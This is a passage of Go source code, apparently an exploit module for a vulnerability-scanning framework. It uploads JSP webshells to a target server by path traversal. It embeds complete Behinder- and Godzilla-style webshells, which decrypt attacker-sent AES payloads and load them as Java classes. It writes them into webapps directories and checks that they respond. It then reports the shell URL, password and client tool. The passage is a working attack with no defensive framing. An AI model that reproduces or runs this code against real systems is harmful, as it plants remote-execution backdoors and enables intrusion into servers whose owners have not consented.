					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				} else if webshell == "custom" {
					filename = goutils.B2S(ss.Params["filename"])
					content = goutils.B2S(ss.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				savePathMap := map[string]string{
					`\ROOT\` + filename:       `/center_cas/..;/` + filename + `;.html`,
					`\clusterMgr\` + filename: `/clusterMgr/` + filename + `;.html`,
				}
				for path := range savePathMap {
					if _, err := sendPayload606bcf97(expResult.HostInfo, "$$$$$webapps"+path+":"+base64.StdEncoding.EncodeToString([]byte(content))); err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cfgCheck := httpclient.NewGetRequestConfig(savePathMap[path])
					cfgCheck.VerifyTls = false
					cfgCheck.FollowRedirect = false
					rspCheck, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgCheck)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if rspCheck != nil && ((rspCheck.StatusCode != 200 && rspCheck.StatusCode != 500) || strings.Contains(rspCheck.Utf8Html, "404")) {
						continue
					}
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rspCheck.Request.URL.Path + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					if webshell != "custom" {
						expResult.Output += "Webshell type: jsp"
					}
					return expResult
				}
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
